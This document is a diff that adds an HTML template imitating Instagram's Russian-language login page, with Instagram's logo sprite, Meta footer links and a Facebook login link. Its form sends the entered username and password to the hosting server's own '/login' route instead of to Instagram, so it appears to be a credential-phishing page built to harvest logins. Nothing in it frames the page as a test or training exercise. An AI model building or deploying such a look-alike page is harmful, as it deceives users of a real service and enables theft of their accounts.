@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Вход • Instagram</title>
+
+  <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAGAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wDk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkA5OTkAP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wAAAAAA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5AAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wAAAAAA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5AAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wAAAAAA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5AAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wAAAAAA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5AAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wAAAAAA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5ADk5OQA5OTkAOTk5AAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wAAAAAAAP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
+
+</head>
+
+  <!-- Шрифт логотипа -->
+  <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
+
+  <style>
+    body {
+      margin: 0;
+      background: #fafafa;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 40px;
+    }
+
+    /* Контейнер карточки */
+    .card {
+      width: 350px;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      text-align: center;
+      border-radius: 3px;
+    }
+
+    /* Логотип */
+    .logo {
+      font-family: 'Billabong', sans-serif;
+      font-size: 58px;
+      margin-bottom: 30px;
+      letter-spacing: 1px;
+    }
+
+    /* Поля ввода */
+    input {
+      width: 100%;
+      margin-bottom: 8px;
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #a8a8a8;
+    }
+
+    /* Кнопка */
+    button {
+      width: 100%;
+      margin-top: 12px;
+      padding: 9px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #fff;
+      background: #0095f6;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    /* Линия ИЛИ */
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+
+    .divider span {
+      margin: 0 20px;
+    }
+
+    /* Facebook кнопка */
+    .fb-login {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      color: #385185;
+      font-weight: 600;
+      font-size: 14px;
+      text-decoration: none;
+      margin-bottom: 15px;
+    }
+
+    .fb-login img {
+      width: 20px;
+      height: 20px;
+    }
+
+    /* Forgot password */
+    .forgot {
+      font-size: 12px;
+      color: #385185;
+      text-decoration: none;
+    }
+
+    /* Ошибка */
+    .error {
+      height: 20px;
+      font-size: 14px;
+      color: #ed4956;
+      margin-top: 10px;
+    }
+
+    /* Нижняя карточка */
+    .bottom-card {
+      width: 350px;
+      margin-top: 10px;
+      padding: 20px;
+      text-align: center;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+
+    .bottom-card a {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    /* Футер */
+    footer {
+      margin-top: 40px;
+      text-align: center;
+      font-size: 12px;
+      color: #8e8e8e;
+      width: 100%;
+      padding-bottom: 40px;
+    }
+
+    footer div {
+      margin-top: 10px;
+      word-wrap: break-word;
+      line-height: 22px;
+    }
+
+    footer a {
+      text-decoration: none;
+      color: #8e8e8e;
+      margin: 0 6px;
+    }
+
+    .insta-logo {
+  background-image: url("https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png");
+  background-position: 0 -2959px;
+  background-size: auto;
+  width: 175px;
+  height: 51px;
+  background-repeat: no-repeat;
+  display: inline-block;
+  margin-bottom: 30px;
+  margin-top: 10px;
+}
+
+
+    /* 📱📱 АДАПТИВ ДЛЯ МОБИЛЬНЫХ */
+    @media (max-width: 480px) {
+
+      body {
+        padding-top: 10px;
+      }
+
+      .card {
+        width: 100%;
+        border: none;
+        background: transparent;
+        padding: 0 30px;
+      }
+
+      .bottom-card {
+        width: 100%;
+        border: none;
+        background: transparent;
+        font-size: 14px;
+      }
+
+      button {
+        font-size: 16px;
+        padding: 12px;
+      }
+
+      input {
+        font-size: 16px;
+        padding: 12px;
+      }
+
+      .logo {
+        font-size: 64px;
+        margin-bottom: 25px;
+      }
+    }
+
+  </style>
+</head>
+<body>
+
+<div class="card">
+
+  <i class="insta-logo" aria-label="Instagram" role="img"></i>
+
+
+  <form method="POST" action="/login">
+    <input type="text" name="login" placeholder="Телефон, имя пользователя или эл. адрес" required>
+    <input type="password" name="password" placeholder="Пароль" required>
+
+    <button type="submit">Войти</button>
+
+    <div class="divider"><span>ИЛИ</span></div>
+
+   <a class="fb-login">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png"
+       alt="fb" width="20" height="20">
+      Войти через Facebook
+   </a>
+
+
+    <a href="#" class="forgot">Забыли пароль?</a>
+
+    <div class="error">{% if error %}{{ error }}{% endif %}</div>
+
+  </form>
+</div>
+
+<div class="bottom-card">
+  У вас нет аккаунта? <a href="#">Зарегистрироваться</a>
+</div>
+
+<footer>
+  <div>
+    <a href="#">Meta</a>
+    <a href="#">Информация</a>
+    <a href="#">Блог</a>
+    <a href="#">Вакансии</a>
+    <a href="#">Помощь</a>
+    <a href="#">API</a>
+    <a href="#">Конфиденциальность</a>
+    <a href="#">Условия</a>
+    <a href="#">Instagram Lite</a>
+    <a href="#">Threads</a>
+  </div>
+
+  <div style="margin-top:15px;">
+    Русский © 2025 Instagram from Meta
+  </div>
+</footer>
+
+</body>
+</html>
